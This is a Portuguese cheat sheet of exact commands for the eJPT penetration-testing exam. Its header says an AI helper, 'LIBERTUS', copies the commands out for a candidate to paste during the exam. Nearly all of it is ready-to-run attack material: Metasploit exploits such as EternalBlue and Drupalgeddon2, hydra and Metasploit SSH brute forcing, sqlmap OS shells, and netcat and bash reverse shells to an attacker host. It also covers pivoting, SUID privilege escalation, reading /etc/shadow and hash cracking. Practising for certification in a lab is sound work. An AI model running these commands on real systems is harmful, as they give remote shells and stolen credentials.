# CHEAT SHEET eJPT — Comandos Exatos
Atualizado 2026-10-14 (véspera do exame). Uso: LIBERTUS copia daqui e manda pronto pro Lorran colar.
Substituir `IP` = alvo, `LHOST` = IP do Kali (descobrir com `ip addr`), `RANGE` = ex 192.168.100.

---

## 0. DESCOBERTA INICIAL (sempre começar aqui)
```bash
ip addr                              # descobrir IP do Kali e a rede
ip route                             # ver gateways/rotas (dica de rede interna)
nmap -sn RANGE.0/24                  # ping sweep — lista hosts vivos
```
Excluir da contagem: `.1` (gateway) e o IP do próprio Kali.

---

## 1. NMAP
### Scans base
```bash
nmap -sV -sC IP                      # versão + scripts default (padrão de entrada)
nmap -p- -T4 IP                      # TODAS as 65535 portas TCP
nmap -sV -p- -T4 IP                  # completo (mais lento)
nmap -A IP                           # OS + versão + scripts + traceroute
nmap -sU --top-ports 20 IP           # UDP top 20 (SNMP 161, TFTP 69, etc.)
nmap -Pn IP                          # se host bloqueia ping mas está vivo
nmap -sV -oN scan.txt IP             # salvar output em arquivo
```
### Flags úteis
- `-sV` versão de serviço · `-sC` scripts default · `-O` OS (pode ser unreliable)
- `-p 80,443,445` portas específicas · `-p-` todas · `-T4` rápido
- `-Pn` pular ping · `-oN arquivo` salvar · `-v` verbose
- `--reason` **mostra POR QUE o nmap achou o host up/down** — usar sempre que
  o resultado parecer errado (`arp-response`, `syn-ack`, `user-set`, `no-response`)

### "Host seems down" — a decisão medida (lab 18/10/2026)
| Situação | O que decide | O que fazer |
|---|---|---|
| Mesma rede local (/24) | **ARP** — responde mesmo com `iptables -P INPUT DROP` | se diz down, o host está desligado; não precisa `-Pn` |
| Através de roteador/VPN/pivô | ICMP echo + SYN/443 + ACK/80 + timestamp | **`-Pn` sempre** — host com ICMP filtrado é invisível |
| Via proxychains (SOCKS) | só `connect()` em **80 e 443** | `-Pn` é obrigatório; `-sn` pelo proxy não descobre nada |
| Descobrir por SOCKS sem `-Pn` | `-PS<porta real>` (vira connect) | `nmap -sn -PS22,80,443,445,8080 IP` |
| `-p X` deu "host down" | a porta **nunca foi testada** | repetir com `-Pn` antes de concluir |

```bash
# custo medido numa /24: discovery 26,3 s (e esconde ICMP-filtrado)
#                        -Pn       2,2 s (e mostra tudo)
nmap -sn -PS22,80,443,445,8080 IP     # discovery em rede roteada
nmap -Pn -p- -T4 IP                   # pivô: não perde tempo com ping
nmap -Pn -p8080 --reason IP           # open/syn-ack vs filtered/no-response
```
Regra: `filtered` ≠ `down`. `filtered` = host vivo, firewall dropando.
Análise completa + pcaps: `evolucao/analise_2026-10-18_host-discovery-nmap-arp.md`

### NSE relevantes no exame
```bash
# SMB (o mais importante)
nmap -p445 --script smb-os-discovery IP          # versão exata do Windows (MELHOR que -O)
nmap -p445 --script smb-vuln-ms17-010 IP         # EternalBlue — confirma antes de explorar
nmap -p445 --script "smb-vuln-*" IP              # todas vulns SMB (ms17-010, ms08-067, conficker...)
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-enum-domains IP
nmap -p139,445 --script smb-security-mode,smb2-security-mode IP   # assinatura SMB

# FTP
nmap -p21 --script ftp-anon IP                   # login anônimo permitido?
nmap -p21 --script ftp-* IP                      # ftp-bounce, ftp-vsftpd-backdoor, ftp-proftpd-backdoor

# HTTP
nmap -p80,8080 --script http-enum IP             # enumera dirs/apps conhecidos
nmap -p80 --script http-title,http-headers IP
nmap -p80 --script http-wordpress-enum IP        # CMS WordPress
nmap -p80 --script http-shellshock IP            # CGI shellshock
nmap -p80 --script http-methods IP               # métodos (PUT habilitado = upload)

# SSH (bruteforce via nmap — funciona mesmo sem hydra SSH)
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
nmap -p22 --script ssh-auth-methods IP           # quais métodos de auth o servidor aceita
```

---

## 2. METASPLOIT
### Fluxo padrão
```bash
msfconsole -q
search TERMO                         # ex: search ms17-010
use exploit/CAMINHO                  # ex: use exploit/windows/smb/ms17_010_eternalblue
info                                 # detalhes do módulo
show options                         # ver o que precisa configurar
set RHOSTS IP
set LHOST LHOST_DO_KALI
run                                  # ou 'exploit'
# se "Cannot reliably check exploitability":
set ForceExploit true
run
```
### ONELINER (usar no lab INE — copy/paste múltiplo quebra)
```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS IP; set LHOST LHOST; run"
```
### Módulos mais cobrados
```bash
# MS17-010 EternalBlue (SMB/445) — o mais frequente no eJPT
use exploit/windows/smb/ms17_010_eternalblue
# Verificar antes:
use auxiliary/scanner/smb/smb_ms17_010

# MS17-010 via psexec (alternativa quando eternalblue falha)
use exploit/windows/smb/ms17_010_psexec

# FTP anonymous / vsftpd backdoor
use auxiliary/scanner/ftp/anonymous
use exploit/unix/ftp/vsftpd_234_backdoor

# SSH bruteforce
use auxiliary/scanner/ssh/ssh_login
set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run

# Drupal (visto no exame real)
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS IP; set TARGETURI /drupal; run

# Handler p/ receber shell de exploit manual
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT 4444; run

# Upgrade shell simples -> meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1; run
```
> Verificado hoje: `ms17_010_eternalblue`, `vsftpd_234_backdoor`, `ssh_login`, `autoroute`, `socks_proxy`, `multi/handler` todos presentes no MSF local.
### Meterpreter — pós-exploração
```bash
sysinfo · getuid · getprivs · hashdump
shell                                # cai no shell nativo
background                           # volta pro msf mantendo a sessão
sessions -l                          # listar sessões
sessions -i 1                        # interagir com sessão 1
search post/multi/manage/shell_to_meterpreter   # upgrade shell->meterpreter
```

---

## 3. HYDRA
```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP
hydra -L users.txt -P pass.txt ssh://IP -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://IP

# HTTP POST (formulário de login) — ajustar campos e a string de falha
hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# HTTP GET Basic Auth
hydra -l admin -P pass.txt IP http-get /admin
```
Flags: `-l` user único · `-L` lista users · `-p` senha única · `-P` lista senhas · `-t N` threads · `-f` para no 1º hit · `-s PORTA`.
**Pitfall:** rockyou+SSH é LENTÍSSIMO (~9000h estimado no exame). Preferir credenciais achadas em arquivos/CMS, ou wordlist pequena. Usar hydra só quando há alvo pequeno/óbvio.

### SSH bruteforce — fallbacks se o hydra SSH não existir
No Kali da INE o hydra tem SSH. No apoio LOCAL do LIBERTUS o hydra está compilado sem módulo SSH → usar:
```bash
# 1) Metasploit (recomendado)
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
# depois: sessions -l  /  sessions -i 1

# 2) nmap
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP

# 3) wrapper local com sshpass
bash ~/LIBERTUS/ejpt/sshbrute.sh IP root /usr/share/wordlists/rockyou.txt
```

---

## 4. GOBUSTER
```bash
# Diretórios
gobuster dir -u http://IP -w /usr/share/wordlists/common.txt
gobuster dir -u http://IP -w /usr/share/wordlists/common.txt -x php,txt,html
gobuster dir -u http://IP:8080 -w /usr/share/wordlists/common.txt -t 50

# DNS/vhost
gobuster vhost -u http://IP -w wordlist.txt
```
Flags: `-u` URL · `-w` wordlist · `-x` extensões · `-t` threads · `-s` status codes · `-b` blacklist.
Wordlists locais: `/usr/share/wordlists/common.txt`. No Kali INE: `/usr/share/wordlists/dirb/common.txt`.

---

## 5. SQLMAP
```bash
# Detecção
sqlmap -u "http://IP/page.php?id=1" --batch
sqlmap -u "http://IP/page.php?id=1" --dbs --batch        # listar bancos
sqlmap -u "http://IP/page.php?id=1" -D nome --tables --batch
sqlmap -u "http://IP/page.php?id=1" -D nome -T users --dump --batch
# POST / cookies
sqlmap -u "http://IP/login.php" --data="user=a&pass=b" --batch
sqlmap -u "http://IP/page" --cookie="PHPSESSID=xxx" --batch
# Shell / arquivo
sqlmap -u "..." --os-shell --batch
```
Flags: `--batch` (sem perguntas) · `--dbs` · `--tables` · `--dump` · `-D`/`-T`/`-C` · `--level 3 --risk 2` (mais agressivo) · `--cookie`.

---

## 6. NETCAT
```bash
# Listener no atacante (Kali)
nc -lvnp 4444

# Reverse shell (rodar NO ALVO)
nc -e /bin/sh LHOST 4444                 # Linux com nc que tem -e
nc -e cmd.exe LHOST 4444                 # Windows
# Sem -e (nc BSD/Linux moderno):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
bash -i >& /dev/tcp/LHOST/4444 0>&1      # sem nc nenhum (bash puro)

# Bind shell (alvo escuta, atacante conecta)
nc -lvnp 4444 -e /bin/sh                 # no alvo
nc IP 4444                               # no atacante

# Transferência de arquivo
nc -lvnp 4444 > recebido.txt             # recebedor
nc IP 4444 < arquivo.txt                 # enviador

# Banner grab
nc -nv IP 21
```
Após pegar shell: estabilizar com `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

---

## 7. PIVOTING (Metasploit) — OBRIGATÓRIO no exame
Depois de ter uma sessão meterpreter num host dual-homed:
```bash
# Dentro do meterpreter — descobrir rede interna
run get_local_subnets            # ou: shell -> ip addr / ipconfig /all

# Adicionar rota automática para a rede interna
run autoroute -s 192.168.0.0/24
# (ou manual do msf:)
background
route add 192.168.0.0 255.255.255.0 1     # 1 = id da sessão
route print

# Agora scanners do msf alcançam a rede interna
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.0.0/24; set PORTS 22,80,445,3306; run

# Port forward (acessar serviço interno via localhost do Kali)
# no meterpreter:
portfwd add -l 3389 -p 3389 -r 192.168.0.10
portfwd list

# SOCKS proxy para usar nmap/hydra na rede interna via proxychains
use auxiliary/server/socks_proxy
set VERSION 4a; set SRVPORT 1080; run
# depois: proxychains nmap -sT -Pn 192.168.0.10
```
Sequência mental: sessão no host de borda → `ipconfig /all`/`ip addr` p/ achar 2ª rede → `autoroute` → portscan interno → explorar/portfwd.

---

## 8. ESCALADA DE PRIVILÉGIO (Linux) — gap da 1ª tentativa
```bash
# SUID (o clássico do eJPT)
find / -perm -4000 -type f 2>/dev/null
# se 'find' for SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit
# sudo mal configurado
sudo -l
# consultar GTFOBins pro binário achado

# hashes
cat /etc/passwd; cat /etc/shadow
# quebrar
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## 9. QUEBRA DE HASH (John)
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
john hash.txt --format=NT --wordlist=rockyou.txt      # NTLM Windows
# apoio local LIBERTUS:
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---
## 10. ARSENAL LOCAL LIBERTUS (fora do exame — simulação/validação)
Ferramentas extras no Ubuntu do Lorran (verificadas 14/10):
```bash
nikto -h http://IP                       # scanner web geral (SSL OK)
ffuf -u http://IP/FUZZ -w /usr/share/wordlists/common.txt   # fuzzing rápido
nuclei -u http://IP -severity critical,high                 # templates de vuln
subfinder -d dominio.com                                    # subdomínios
proxychains: AUSENTE → usar socks_proxy do MSF + route add (não precisa de proxychains no host)
searchsploit: AUSENTE → usar https://www.exploit-db.com no navegador ou 'msfconsole search'
wpscan: AUSENTE → usar 'nmap --script http-wordpress-enum' + manual
```

---

## LEMBRETES DO LAB INE
- Terminal Kali via browser NÃO cola (Ctrl+V/Shift+V/botão meio falham) e NÃO digita "?". Workarounds: barra do Chrome para URLs com "?", webshell de host comprometido para colar, msfconsole `-x` para comandos compostos, Telegram como fonte de cópia.
- rockyou em `.gz` no Kali INE → `gunzip` antes. common.txt não existe lá.
- Reutilizar credenciais em TODOS os serviços — tema recorrente.
